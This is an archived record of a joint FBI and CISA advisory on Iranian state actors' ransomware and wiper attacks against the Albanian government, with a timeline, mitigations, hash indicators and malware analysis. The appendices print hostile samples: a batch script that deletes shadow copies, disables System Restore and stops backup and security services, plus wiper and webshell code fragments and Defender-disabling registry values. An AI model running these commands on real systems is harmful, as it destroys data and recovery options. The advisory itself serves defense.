{
    "id": "506f2069-8b4d-4fc7-a10a-5ec4a41c5e0a",
    "created_at": "2023-01-12T15:08:42.763579Z",
    "updated_at": "2025-03-27T02:10:26.334631Z",
    "deleted_at": null,
    "sha1_hash": "c1ddc04ea2cee30bed7634528cbe7e33ca803827",
    "title": "2022-09-21 - Alert (AA22-264A) Iranian State Actors Conduct Cyber Operations Against the Government of Albania",
    "authors": "",
    "file_creation_date": "2022-10-02T12:22:02Z",
    "file_modification_date": "2022-10-02T12:22:02Z",
    "file_size": 1295375,
    "plain_text": "# Iranian State Actors Conduct Cyber Operations Against the Government of Albania\n\n**cisa.gov/uscert/ncas/alerts/aa22-264a**\n\n### Summary\n\nThe Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint\nCybersecurity Advisory to provide information on recent cyber operations against the Government of Albania in July and\nSeptember. This advisory provides a timeline of activity observed, from initial access to execution of encryption and wiper attacks.\nAdditional information concerning files used by the actors during their exploitation of and cyber attack against the victim\norganization is provided in Appendices A and B.\n\nIn July 2022, Iranian state cyber actors—identifying as “HomeLand Justice”—launched a destructive cyber attack against the\nGovernment of Albania which rendered websites and services unavailable. A FBI investigation indicates Iranian state cyber actors\nacquired initial access to the victim’s network approximately 14 months before launching the destructive cyber attack, which\nincluded a ransomware-style file encryptor and disk wiping malware. The actors maintained continuous network access for\napproximately a year, periodically accessing and exfiltrating e-mail content.\n\nBetween May and June 2022, Iranian state cyber actors conducted lateral movements, network reconnaissance, and credential\nharvesting from Albanian government networks. In July 2022, the actors launched ransomware on the networks, leaving an antiMujahideen E-Khalq (MEK) message on desktops. When network defenders identified and began to respond to the ransomware\nactivity, the cyber actors deployed a version of ZeroCleare destructive malware.\n\nIn June 2022, HomeLand Justice created a website and multiple social media profiles posting anti-MEK messages. On July 18,\n2022, HomeLand Justice claimed credit for the cyber attack on Albanian government infrastructure. On July 23, 2022, Homeland\nJustice posted videos of the cyber attack on their website. From late July to mid-August 2022, social media accounts associated\nwith HomeLand Justice demonstrated a repeated pattern of advertising Albanian Government information for release, posting a poll\nasking respondents to select the government information to be released by HomeLand Justice, and then releasing that information\n—either in a .zip file or a video of a screen recording with the documents shown.\n\nIn September 2022, Iranian cyber actors launched another wave of cyber attacks against the Government of Albania, using similar\nTTPs and malware as the cyber attacks in July. These were likely done in retaliation for public attribution of the cyber attacks in July\nand severed diplomatic ties between Albania and Iran.\n\n[Download the PDF version of this report: pdf, 1221 kb](https://www.cisa.gov/sites/default/files/publications/aa22-264a-iranian-cyber-actors-conduct-cyber-operations-against-the-government-of-albania.pdf)\n\n[Download the STIX file: pdf, 44 KB](https://www.cisa.gov/sites/default/files/publications/AA22-264A.stix.xml)\n\n### Technical Details\n\n**Initial access**\n\n**Timeframe: Approximately 14 months before encryption and wiper attacks.**\n\n**Details: Initial access was obtained via exploitation of an Internet-facing Microsoft SharePoint, exploiting CVE-2019-0604.**\n\n**Persistence and Lateral movement**\n\n**Timeframe: Approximately several days to two months after initial compromise.**\n\n**Details: After obtaining access to the victim environment, the actors used several .aspx webshells,** `pickers.aspx,`\n```\nerror4.aspx, and ClientBin.aspx, to maintain persistence. During this timeframe, the actors also used RDP (primarily), SMB,\n\n```\nand FTP for lateral movement throughout the victim environment.\n\n**Exchange Server compromise**\n\n**Timeframe: Approximately 1-6 months after initial compromise.**\n\n**Details: The actors used a compromised Microsoft Exchange account to run searches (via CmdLets New-MailboxSearch and Get-**\nRecipient) on various mailboxes, including for administrator accounts. In this timeframe, the actors used the compromised account\nto create a new Exchange account and add it to the Organization Management role group.\n\n\n-----\n\n**Likely Email exfiltration**\n\n**Timeframe: Approximately 8 months after initial compromise.**\n\n**Details: The actors made thousands of HTTP POST requests to Exchange servers of the victim organization. The FBI observed**\nthe client transferring roughly 70-160 MB of data, and the server transferring roughly 3-20 GB of data.\n\n**VPN activity**\n\n**Timeframe: Approximately 12-14 months after initial compromise.**\n\n**Details: Approximately twelve months after initial access and two months before launching the destructive cyber attack, the actors**\nmade connections to IP addresses belonging to the victim organization’s Virtual Private Network (VPN) appliance. The actors’\nactivity primarily involved two compromised accounts. The actors executed the “Advanced Port Scanner”\n(advanced_port_scanner.exe). The FBI also found evidence of Mimikatz usage and LSASS dumping.\n\n**File Cryptor (ransomware-style file encryptor)**\n\n**Timeframe: Approximately 14 months after initial compromise.**\n\n**Details: For the encryption component of the cyber attack, the actor logged in to a victim organization print server via RDP and**\nkicked off a process (Mellona.exe) which would propagate the GoXml.exe encryptor to a list of internal machines, along with a\npersistence script called win.bat. As deployed, GoXML.exe encrypted all files (except those having extensions .exe, .dll, .sys, .lnk,\nor .lck) on the target system, leaving behind a ransom note titled How_To_Unlock_MyFiles.txt in each folder impacted.\n\n**Wiper attack**\n\n**Timeframe: Approximately 14 months after initial compromise.**\n\n**Details: In the same timeframe as the encryption attack, the actors began actions that resulted in raw disk drives being wiped with**\nthe Disk Wiper tool (cl.exe) described in Appendix A. Approximately over the next eight hours, numerous RDP connections were\nlogged from an identified victim server to other hosts on the victim’s network. Command line execution of cl.exe was observed in\ncached bitmap files from these RDP sessions on the victim server.\n\n### Mitigations\n\nFBI and CISA recommend organizations apply the following best practices to reduce risk of compromise:\n\n**Ensure anti-virus and anti-malware software is enabled and signature definitions are updated regularly and in a timely**\nmanner. Well-maintained anti-virus software may prevent use of commonly deployed cyber attacker tools that are delivered\nvia spear-phishing.\n**Adopt threat reputation services at the network device, operating system, application, and email service levels.**\nReputation services can be used to detect or prevent low-reputation email addresses, files, URLs, and IP addresses used in\nspear-phishing attacks.\nIf your organization is employing certain types of software and appliances vulnerable to known Common Vulnerabilities and\n[Exposures (CVEs), ensure those vulnerabilities are patched. Prioritize patching known exploited vulnerabilities.](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n**Monitor for unusually large amounts of data (i.e. several GB) being transferred from a Microsoft Exchange server.**\n**Check the host-based indications, including webshells, for positive hits within your environment.**\n**Maintain and test an incident response plan.**\n**Ensure your organization has a vulnerability management program in place and that it prioritizes patch management and**\n[vulnerability scanning of known exploited vulnerabilities. Note: CISA’s](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) [Cyber Hygiene Services (CyHy) are free to all state,](https://www.cisa.gov/cyber-hygiene-services)\nlocal, tribal, and territorial (SLTT) organizations, as well as public and private sector critical infrastructure organizations.\n**Properly configure and secure internet-facing network devices.**\n\nDo not expose management interfaces to the internet.\nDisable unused or unnecessary network ports and protocols.\nDisable/remove unused network services and devices.\n**Adopt** **[zero-trust principles and architecture, including:](https://www.cisa.gov/blog/2021/09/07/no-trust-no-problem-maturing-towards-zero-trust-architectures)**\n\nMicro-segmenting networks and functions to limit or block lateral movements.\nEnforcing phishing-resistant multifactor authentication (MFA) for all users and VPN connections.\nRestricting access to trusted devices and users on the networks.\n\nFor more information on Iranian government-sponsored malicious cyber activity, see CISA's webpage – Iran Cyber Threat Overview\nand Advisories.\n\n\n-----\n\n### Appendix A\n\n**Host-based IOCs**\n\n_Additional details concerning some of these files are provided in Appendix B._\n\n**File** **MD5 Hash** **Notes**\n\nError4.aspx 81e123351eb80e605ad73268a5653ff3 Webshell\n\ncl.exe 7b71764236f244ae971742ee1bc6b098 Wiper\n\nGoXML.exe bbe983dba3bf319621b447618548b740 Encryptor\n\nGoxml.jpg 0738242a521bdfe1f3ecc173f1726aa1\n\nClientBin.aspx a9fa6cfdba41c57d8094545e9b56db36 Webshell (reverse-proxy connections)\n\nPickers.aspx 8f766dea3afd410ebcd5df5994a3c571 Webshell\n\nevaluatesiteupgrade.cs.aspx Unknown Webshell\n\nmellona.exe 78562ba0069d4235f28efd01e3f32a82 Propagation for Encryptor\n\nwin.bat 1635e1acd72809479e21b0ac5497a79b Launches GoXml.exe on startup\n\nwin.bat 18e01dee14167c1cf8a58b6a648ee049 Changes desktop background to encryption image\n\nbb.bat 59a85e8ec23ef5b5c215cd5c8e5bc2ab Saves SAM and SYSTEM hives to C:\\Temp, makes cab\narchive\n\ndisable_defender.exe 60afb1e62ac61424a542b8c7b4d2cf01 Disables Windows Defender\n\nrwdsk.sys 8f6e7653807ebb57ecc549cef991d505 Raw disk driver utilized by wiper malware\n\nApp_Web_bckwssht.dll e9b6ecbf0783fa9d6981bba76d949c94\n\n**Network-based IOCs**\n\nFBI review of Commercial VPN service IP addresses revealed the following resolutions (per Akamai data):\n\n**Country** **Company**\n\nAL KEMINET LTD.\n\nDE NOOP-84-247-59-0-25\n\nDE GSL NETWORKS\n\nGB LON-CLIENTS\n\nGB GB-DATACENTER\n\n\n-----\n\nNL NL-LAYERSWITCH-20190220\n\nNL PANQ-45-86-200-0\n\nUS PRIVATE CUSTOMER\n\nUS BANDITO NETWORKS\n\nUS EXTERNAL\n\nUS RU-SELENA-20080725\n\nUS TRANS OCEAN NETWORK\n\n## Appendix B\n\n### Ransomware Cryptor\n```\nGoXML.exe is a ransomware style file encryptor. It is a Windows executable, digitally signed with a certificate issued to the Kuwait\n\n```\nTelecommunications Company KSC, a subsidiary of Saudi Telecommunications Company (STC).\n\nIf executed with five or more arguments (the arguments can be anything, as long as there are five or more), the program silently\nengages its file encryption functionality. Otherwise, a file-open dialog Window is presented, and any opened documents receive an\nerror prompt labeled, `Xml Form Builder.`\n\nAll internal strings are encrypted with a hard coded RC4 key. Before internal data is decrypted, the string decryption routine has a\nbuilt-in self-test that decrypts a DWORD value and tests to see if the plaintext is the string `yes . If so, it will continue to decode its`\ninternal strings.\n\nThe ransomware will attempt to launch the following batch script; however, this will fail due to a syntax error.\n\n@for /F \"skip=1\" %C in ('wmic LogicalDisk get DeviceID') do (@wmic /namespace:\\\\root\\default Path SystemRestore Call disable\n\"%C\\\" & @rd /s /q %C\\$Recycle.bin)\n\n@vssadmin.exe delete shadows /all /quiet\n\n@set SrvLst=vss sql svc$ memtas mepos sophos veeam backup GxVss GxBlr GxFWD GxCVD GxCIMgr DefWatch ccEvtMgr\nccSetMgr SavRoam RTVscan QBFCService QBIDPService ntuit.QuickBooks.FCS QBCFMonitorService YooBackup YooIT\nzhudongfangyu sophos stc_raw_agent VSNAPVSS VeeamTransportSvc VeeamDeploymentService VeeamNFSSvc veeam\nPDVFSService BackupExecVSSProvider BackupExecAgentAccelerator BackupExecAgentBrowser\nBackupExecDiveciMediaService BackupExecJobEngine BackupExecManagementService BackupExecRPCService AcrSch2Svc\nAcronisAgent CASAD2DWebSvc CAARCUpdateSvc\n\n@for %C in (%SrvLst%) do @net stop %C\n\n@set SrvLst=\n\n@set PrcLst=mysql sql oracle ocssd dbsnmp synctime agntsvc isqlplussvc xfssvccon mydesktopservice ocautoupds encsvc\ntbirdconfig mydesktopqos ocomm dbeng50 sqbcoreservice excel infopath msaccess mspub onenote outlook powerpnt steam\nthebat thunderbird visio winword wordpad notepad\n\n@for %C in (%PrcLst%) do @taskkill /f /im \"%C.exe\"\n\n@set PrcLst=\n\n@exit\n\nThe syntax error consists of a missing backslash that separates `system32 and` `cmd.exe, so the process is launched as`\n```\nsystem32cmd.exe which is an invalid command.\n\n```\n\n-----\n\nScript Launch Bug\n\nThe ransomware’s file encryption routine will generate a random string, take the MD5 hash and use that to generate an RC4 128\nkey which is used to encrypt files. This key is encrypted with a hard coded Public RSA key and converted to Base64 utilizing a\ncustom alphabet. This is appended to the end of the ransom note.\n\nThe cryptor places a file called `How_To_Unlock_MyFiles.txt in directories with encrypted files.`\n\nEach encrypted file is given the `.lck extension and the contents of each file are only encrypted up to` `0x100000 or 1,048,576`\nbytes which is a hard coded limit.\n\nSeparately, the actor ran a batch script (win.bat below) to set a specific desktop background.\n\n### File Details\n\n**GoXml.exe**\n\nFile Size: 43.48 KB (44520 bytes)\n\nSHA256: f116acc6508843f59e59fb5a8d643370dce82f492a217764521f46a856cc4cb5\n\nSHA1: 5d117d8ef075f3f8ed1d4edcc0771a2a0886a376\n\nMD5: bbe983dba3bf319621b447618548b740\n\nSSDeep: 768:+OFu8Q3w6QzfR5Jni6SQD7qSFDs6P93/q0XIc/UB5EPABWX\n\n:RFu8QAFzffJui79f13/AnB5EPAkX (Ver 1.1)\n\nFile Type: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS\nWindows\n\nPE Header Timestamp: 2016-04-30 17:08:19\n\nImpHash: 5b2ce9270beea5915ec9adbcd0dbb070\n\nCert #0 Subject C=KW, L=Salmiya, O=Kuwait\nTelecommunications Company KSC, OU=Kuwait\nTelecommunications Company, CN=Kuwait\nTelecommunications Company KSC\n\nCert #0 Issuer C=US, O=DigiCert Inc,\nOU=www.digicert.com, CN=DigiCert SHA2\nAssured ID Code Signing CA\n\nCert #0 SHA1\n55d90ec44b97b64b6dd4e3aee4d1585d6b14b26f\n\n**win.bat (#1, run malware)**\n\nFile Size: 67 bytes\n\nSHA256: bad65769c0b416bb16a82b5be11f1d4788239f8b2ba77ae57948b53a69e230a6\n\nSHA1: 14b8c155e01f25e749a9726958606b242c8624b9\n\n\n-----\n\nMD5: 1635e1acd72809479e21b0ac5497a79b\n\nSSDeep: 3:LjTFKCkRErG+fyM1KDCFUF82G:r0aH1+DF82G (Ver 1.1)\n\nFile Type: ASCII text, with no line terminators\n\nContents: start /min C:\\ProgramData\\Microsoft\\Windows\\GoXml.exe 1 2 3 4 5 6 7\n\n**win.bat (#2, install desktop image)**\n\nFilename: ec4cd040fd14bff86f6f6e7ba357e5bcf150c455532800edf97782836e97f6d2\n\nFile Size: 765 bytes\n\nSHA256: ec4cd040fd14bff86f6f6e7ba357e5bcf150c455532800edf97782836e97f6d2\n\nSHA1: fce0db6e66d227d3b82d4564446ede0c0fd7598c\n\nMD5: 18e01dee14167c1cf8a58b6a648ee049\n\nSSDeep: 12:wbYVJ69/TsdLd6sdLd3mTDwfV+EVTCuwfV+EVTCuwfV+EVTCuwfV+EVTCuwfV\n\n+Et:wq69/kZxZ3mTDY9HY9HY9HY9HY9j (Ver 1.1)\n\nFile Type: DOS batch file text, ASCII text, with CRLF line terminators\n\n\n-----\n\nContents:\n\n@echo off\n\nsetlocal enabledelayedexpansion\n\nset \"Wtime=!time:~0,2!\"\n\nif \"!Wtime!\" leq \"20\" reg add\n\"HKEY_CURRENT_USER\\Control\nPanel\\Desktop\" /v Wallpaper /t REG_SZ /d\n\"c:\\programdata\\GoXml.jpg\" /f & goto done\n\nif \"!Wtime!\" geq \"20\" reg add\n\"HKEY_CURRENT_USER\\Control\nPanel\\Desktop\" /v Wallpaper /t REG_SZ /d\n\"c:\\programdata\\GoXml.jpg\" /f & goto done\n\n:done\n\ntimeout /t 5 >nul\n\nstart \"\" /b RUNDLL32.EXE\nuser32.dll,UpdatePerUserSystemParameters\n,1,True\n\nstart \"\" /b RUNDLL32.EXE\nuser32.dll,UpdatePerUserSystemParameters\n,1,True\n\nstart \"\" /b RUNDLL32.EXE\nuser32.dll,UpdatePerUserSystemParameters\n,1,True\n\nstart \"\" /b RUNDLL32.EXE\nuser32.dll,UpdatePerUserSystemParameters\n,1,True\n\nstart \"\" /b RUNDLL32.EXE\nuser32.dll,UpdatePerUserSystemParameters\n,1,True\n\nendlocal\n\n**goxml.jpg**\n\nFile Size: 1.2 MB (1259040 bytes)\n\nSHA256: 63dd02c371e84323c4fd9a161a75e0f525423219e8a6ec1b95dd9eda182af2c9\n\nSHA1: 683eaec2b3bb5436f00b2172e287dc95e2ff2266\n\nMD5: 0738242a521bdfe1f3ecc173f1726aa1\n\nSSDeep: 12288:ME0p1RE70zxntT/ylTyaaSMn2fS+0M6puxKfJbDKrCxMe5fPSC2tmx\n\nVjpJT/n37p:MHyUt7yQaaPXS6pjar+MwrjpJ7VIbZg (Ver 1.1)\n\nFile Type: JPEG image data, Exif standard: [TIFF image data, big-endian, direntries=13, height=1752, bps=0,\nPhotometricIntepretation=CMYK, orientation=upper-left, width=2484TIFF image data, big-endian, direntries=13,\nheight=1752, bps=0, PhotometricIntepretation=CMYK, orientation=upper-left, width=2484], progressive, precision 8,\n2484x1752, components 4\n\nSoftware: Adobe Photoshop 22.4 (Windows)\n\n\n-----\n\nModify\nDate:\n\nCreate\nDate:\n\nMetadata\nDate:\n\nProfile\nDate\nTime:\n\nImage\nSize:\n\n\n2022-07-13 20:45:20\n\n2020-06-11 02:13:33\n\n2022-07-13 20:45:20\n\n2000-07-26 05:41:53\n\n2484x1752\n\n\nFile Size: 1.2 MB (1259040 bytes)\n\nSHA256: 63dd02c371e84323c4fd9a161a75e0f525423219e8a6ec1b95dd9eda182af2c9\n\n### Disk Wiper\n\nThe files `cl.exe and` `rwdsk.sys are part of a disk wiper utility that provides raw access to the hard drive for the purposes of`\nwiping data. From the command line the cl.exe file accepts the arguments:\n```\n   in\n   un\n   wp <optional argument>\n\n```\nIf executed with the `in command, the utility will output` `in start! and installs a hard coded file named rwdsk.sys as a service`\nnamed `RawDisk3 . The` `.SYS file is not extracted from the installer however, but rather the installer looks for the file in the same`\ndirectory that the `cl.exe is executed in.`\n\n_It will also load the driver after installation._\n\n\n-----\n\nThe `un command uninstalls the service, outputting the message` `“un start!” to the terminal.`\n\nThe `wp command will access the loaded driver for raw disk access.`\n\nRaw Disk Access\nThe long hexadecimal string is hard coded in the cl.exe binary.\n\nRawDisk3File = (void *)toOpenRawDisk3File(\n\narg2_WideCharStr,\n\n0xC0000000,\n\nL\"B4B615C28CCD059CF8ED1ABF1C71FE03C0354522990AF63ADF3C911E2287A4B906D47D\");\n\nptrRawDiskFile = RawDisk3File;\n\nif ( RawDisk3File )\n\n{\n\nsizeDisk = toGetDiskSize(RawDisk3File);\n\nterminal_out(\"Total Bytez : %lld\\n\", sizeDisk << 9);\n\nThe `wp command also takes an additional argument as a device path to place after \\RawDisk3\\ in the output string. It is`\nuncertain what creates this path to a device as the driver tested did not.\n\nThe output is “wp starts!” followed by the total bytes of the drive and the time the wipe operation takes\n\n\n-----\n\nIf the registry key value HKLM\\SOFTWARE\\EldoS\\EventLog is set to Enabled, the install will generate an event log if at any time\nthe install produces an error. This log contains an error code DWORD followed by the string ..\\..\\DriverLibraries\\DrvSupLib\\install.c.\nIf the system does not have the SOFTWARE\\EldoS key, no event logs would be produced. This feature must be a related to the\nlegitimate EldoS utility.\n\nrwdsk.sys is a “legitimate commercial driver from the EldoS Corporation that is used for interacting with files, disks, and partitions.\nThe driver allows for direct modification of data on a local computer’s hard drive. In some cases, the tool can enact these raw disk\nmodifications from user-mode processes, circumventing Windows operating system security features.\"1\n\n**File Details**\n\n**cl.exe**\n\nFile Size 142.5 KB (145920 bytes)\n\nSHA256 e1204ebbd8f15dbf5f2e41dddc5337e3182fc4daf75b05acc948b8b965480ca0\n\nSHA1 f22a7ec80fbfdc4d8ed796119c76bfac01e0a908\n\nMD5 7b71764236f244ae971742ee1bc6b098\n\nSSDeep 3072:vv2ADi7yOcE/YMBSZ0fZX4kpK1OhJrDwM:vv2jeQ/flfZbKM (Ver 1.1)\n\nFiletype PE32+ executable (console) x86-64, for MS Windows\n\nPE Header Timestamp 2022-07-15 13:26:28\n\nImpHash 58d51c1152817ca3dec77f2eee52cbef\n\n\n-----\n\n**rwdsk.sys**\n\nFile Size 38.84 KB (39776 bytes)\n\nSHA256 3c9dc8ada56adf9cebfc501a2d3946680dcb0534a137e2e27a7fcb5994cd9de6\n\nSHA1 5e061701b14faf9adec9dd0b2423ff3cfc18764b\n\nMD5 8f6e7653807ebb57ecc549cef991d505\n\nSSDeep 768:E31ySCpoCbXnfDbEaJSooKIDyE9aBazWlEAusxsia:0gyCb3MFKIHO4Ausxta (Ver 1.1)\n\nFiletype PE32+ executable (native) x86-64, for MS Windows\n\nPEtype Driver\n\n\nPE Header\nTimestamp\n\n\n2016-03-18 14:44:54\n\n\nImpHash e233f2cdc91faafe1467d9e52f166213\n\n\nCert #0\nSubject\n\n\nCN=VeriSign Time Stamping Services CA, O=VeriSign, Inc., C=US\n\n\nCert #0 Issuer CN=VeriSign Time Stamping Services CA, O=VeriSign, Inc., C=US\n\nCert #0 SHA1 382c18388fb326221dfd7a77ee874f9ba60e04bf\n\n\nCert #1\nSubject\n\n\nC=US, ST=California, L=SANTA CLARA, O=NVIDIA Corporation, CN=NVIDIA Corporation\n\n\nCert #1 Issuer C=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=Terms of use at https://www.verisign.com/rpa (c)10,\nCN=VeriSign Class 3 Code Signing 2010 CA\n\nCert #1 SHA1 30632ea310114105969d0bda28fdce267104754f\n\n\nCert #2\nSubject\n\n\nC=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=(c) 2006 VeriSign, Inc. - For authorized use only,\nCN=VeriSign Class 3 Public Primary Certification Authority - G5\n\n\nCert #2 Issuer C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Code Verification Root\n\nCert #2 SHA1 57534ccc33914c41f70e2cbb2103a1db18817d8b\n\n\nCert #3\nSubject\n\n\nC=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=Terms of use at https://www.verisign.com/rpa (c)10,\nCN=VeriSign Class 3 Code Signing 2010 CA\n\n\nCert #3 Issuer C=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=(c) 2006 VeriSign, Inc. - For authorized use only,\nCN=VeriSign Class 3 Public Primary Certification Authority - G5\n\nCert #3 SHA1 495847a93187cfb8c71f840cb7b41497ad95c64f\n\n### Additional Files\n\n\n-----\n\n**_Web Deployed Reverse Proxy_**\n\n**Description**\n\nClientBin.aspx is an ASP file that contains a Base64 encoded .Net executable (App_Web_bckwssht.dll) that it decodes and loads\nvia Reflection. The .Net executable contains Class and Method obfuscation and internal strings are encoded with a single byte XOR\nobfuscation.\n\npublic static string hair_school_bracket()\n\n{\n\nreturn Umbrella_admit_arctic.rebel_sadreporthospital(\"460F2830272A2F2266052928202F21661627252D27212368\");\n//Invalid Config Package.\n\n}\n\npublic static string Visual_math_already()\n\n{\n\nreturn Umbrella_admit_arctic.rebel_sadreporthospital(\"5304057E0116001607\");  //WV-RESET\n\nThe method rebel_sadreporthospital takes the first byte of the encoded string and XOR’s each subsequent byte to produce the deobfuscated string.\n\nWhen run in context of an IIS web server connecting to the ASPX file will generate a 200 <Encryption DLL Info> 1.5 output.\n\n_Initial connection_\n\nThe hex string represents the following ASCII text:\n\nBase64, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null\n\nSending a POST request with a Base64 encoded IP and port will open a second socket to the supplied IP and port making this a\nWeb proxy.\n\n_Second Socket Opened from POST_\n\n_Request_\nSending a request to WV-RESET with a value will produce an OK response and call a function to shut down the proxy socket.\n\n_Terminate socket_\n\nThe DLL extracts a secondary “EncryptionDLL” named Base64.dll which is loaded via Assembly.Load. This exposes two functions,\nencrypt and decrypt. This DLL is used to decrypt the Proxy IP and port along with data. In this instance the class name is\nmisspelled Bsae64, which is also reflected in the calling DLLs decoded strings. It is uncertain as to why an additional Base64.dll\nbinary is extracted when the same encoding could be hard coded in the original DLL. It is possible other versions of this tool utilize\ndiffering “EncryptionDLL” binaries.\n\n\n-----\n\n_Misspelled Class Name_\n\n_Called Misspelled Name_\n\n**_File Details_**\n\n**ClientBin.aspx**\n\nFile Size 55.24 KB (56561 bytes)\n\nSHA256 7ad64b64e0a4e510be42ba631868bbda8779139dc0daad9395ab048306cc83c5\n\nSHA1 e03edd9114e7a0138d1309034cad6b461ab0035b\n\nMD5 a9fa6cfdba41c57d8094545e9b56db36\n\nSSDeep 768:x9TfK6nOgo5zE/cezUijAwZIFxK1mGjncrF8EAZ0iBDZBZdywb0DwHN4N4wjMxr8:x9TfdOgAi2 (Ver 1.1)\n\nFiletype HTML document text, ASCII text, with very long lines (56458)\n\n**App_Web_bckwssht.dll**\n\nFile Size 41.0 KB (41984 bytes)\n\nSHA256 cad2bc224108142b5aa19d787c19df236b0d12c779273d05f9b0298a63dc1fe5\n\nSHA1 49fd8de33aa0ea0c7432d62f1ddca832fab25325\n\nMD5 e9b6ecbf0783fa9d6981bba76d949c94\n\nSSDeep 384:coY4jnD7l9VAk1dtrGBlLGYEX1tah8dgNyamGOvMTfdYN5qZAsP:hlXAkHRGBlUUh8cFmpv6feYLP\n(Ver 1.1)\n\nFiletype PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\nPEtype DLL\n\n\n-----\n\nPE Header Timestamp 2021-06-07 10:37:55\n\nImpHash dae02f32a21e03ce65412f6e56942daa\n\n**_Disable Defender_**\n\n_Description_\n\ndisable_defender.exe is a Microsoft Windows PE file that attempts to disable Windows Defender. The application will elevate\nprivileges to that of SYSTEM and then attempt to disable Defender’s core functions. A command prompt with status and error\nmessages is displayed as the application executes. No network activity was detected during the evaluation.\n\nUpon execution, a command prompt is launched and a message is displayed if the process is not running as SYSTEM. The\nprocess is then restarted with the required permissions.\n\n_Test validate permissions_\n\nThe application will attempt to terminate the Windows Defender process by calling TerminateProcess for smartscreen.exe:\n\n_Attempt to kill Windows Defender_\n\nThe following Registry Keys were modified to disable Windows Defender:\n\nSet Registry Values (observed Win10 1709)\n\nHKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\\TamperProtection 0\n\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware 1\n\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\\n\nStartupApproved\\Run\\SecurityHealth\n\n\n03 00 00 00 5D 02 00 00 41 3B 47 9D\n\n\nHKLM\\SOFTWARE\\Microsoft\\Windows Defender\\DisableAntiSpyware 1\n\n\n-----\n\nHKLM\\System\\CurrentControlSet\\Services\\WinDefend\\Start 3\n\n\nHKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\\n\nDisableRealtimeMonitoring\n\n\n1\n\n\nUpon completion and if successful the application will display the following messages and wait for user input.\n\n_User Input_\n\n**disable-defender.exe**\n\nFile Size 292.0 KB (299008 bytes)\n\nSHA256 45bf0057b3121c6e444b316afafdd802d16083282d1cbfde3cdbf2a9d0915ace\n\nSHA1 e866cc6b1507f21f688ecc2ef15a64e413743da7\n\nMD5 60afb1e62ac61424a542b8c7b4d2cf01\n\nSSDeep 6144:t2WhikbJZc+Wrbe/t1zT/p03BuGJ1oh7ISCLun:t2WpZnW+/tVoJ1ouQ (Ver 1.1)\n\nFiletype PE32+ executable (console) x86-64, for MS Windows\n\nPEtype EXE\n\nPE Header Timestamp 2021-10-24 15:07:32\n\nImpHash 74a6ef9e7b49c71341e439022f643c8e\n\n1https://attack.mitre.org/software/S0364/\n\n### Revisions\n\nSeptember 21, 2022: Initial Version\n\nSeptember 22, 2022: Reordered items in the Mitigation Section\n\nSeptember 23, 2022: Add the STIX file\n\n[This product is provided subject to this Notification and this](https://www.cisa.gov/privacy/notification) [Privacy & Use policy.](https://www.dhs.gov/privacy-policy)\n\n**Please share your thoughts.**\n\n[We recently updated our anonymous product survey; we'd welcome your feedback.](https://www.surveymonkey.com/r/CISA-cyber-survey?product=https://us-cert.cisa.gov/ncas/alerts/aa22-264a)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-21 - Alert (AA22-264A) Iranian State Actors Conduct Cyber Operations Against the Government of Albania.pdf"
    ],
    "report_names": [
        "2022-09-21 - Alert (AA22-264A) Iranian State Actors Conduct Cyber Operations Against the Government of Albania.pdf"
    ],
    "threat_actors": [
        {
            "id": "20c759c2-cd02-45bb-85c6-41bde9e6a7cf",
            "created_at": "2024-01-18T02:02:34.189827Z",
            "updated_at": "2025-03-27T02:02:09.937024Z",
            "deleted_at": null,
            "main_name": "HomeLand Justice",
            "aliases": [
                "Karma",
                "Storm-842",
                "Void Manticore"
            ],
            "source_name": "ETDA:HomeLand Justice",
            "tools": [
                "BABYWIPER",
                "BiBi Wiper",
                "BiBi-Linux Wiper",
                "BiBi-Windows Wiper",
                "Cl Wiper",
                "LowEraser",
                "No-Justice Wiper",
                "Plink",
                "PuTTY Link",
                "RevSocks",
                "W2K Res Kit"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7f25e108-e694-49b6-a494-c8458b33eb3f",
            "created_at": "2024-01-09T02:00:04.199217Z",
            "updated_at": "2025-03-27T02:00:03.278805Z",
            "deleted_at": null,
            "main_name": "HomeLand Justice",
            "aliases": [],
            "source_name": "MISPGALAXY:HomeLand Justice",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536122,
    "ts_updated_at": 1743041426,
    "ts_creation_date": 1664713322,
    "ts_modification_date": 1664713322,
    "files": {
        "pdf": "https://archive.orkl.eu/c1ddc04ea2cee30bed7634528cbe7e33ca803827.pdf",
        "text": "https://archive.orkl.eu/c1ddc04ea2cee30bed7634528cbe7e33ca803827.txt",
        "img": "https://archive.orkl.eu/c1ddc04ea2cee30bed7634528cbe7e33ca803827.jpg"
    }
}